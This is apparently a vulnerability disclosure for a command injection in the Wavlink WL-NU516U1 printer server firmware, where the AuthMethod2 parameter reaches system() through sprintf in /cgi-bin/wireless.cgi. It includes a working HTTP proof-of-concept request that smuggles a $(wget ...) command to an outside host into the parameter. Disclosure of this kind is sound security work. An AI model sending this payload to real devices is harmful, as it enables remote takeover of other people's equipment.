# WL-NU516U1 wireless.cgi multi_ssid AuthMethod2 Command Injection

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Command Injection

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi.

When the `page` parameter is set to `multi_ssid`, the function `sub_401D68` is invoked.

The `AuthMethod2` parameter flows into `set_bss.sh` commands via sprintf:

```c
sprintf(v29, "set_bss.sh set 2 \"%s\" \"%s\" \"%s\" Admin12345 %s", v8, v14, v18, v34);
system(v29);
```

Where `v14` = AuthMethod2 (user-controlled). The value is placed inside double quotes in the shell command, allowing injection via quote closure.

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 112

page=multi_ssid&wifi_multi_ssid=1&SSID2G2=TestSSID&AuthMethod2=$(wget http://192.168.6.1:6666/auth2)&EncrypType2=NONE
```
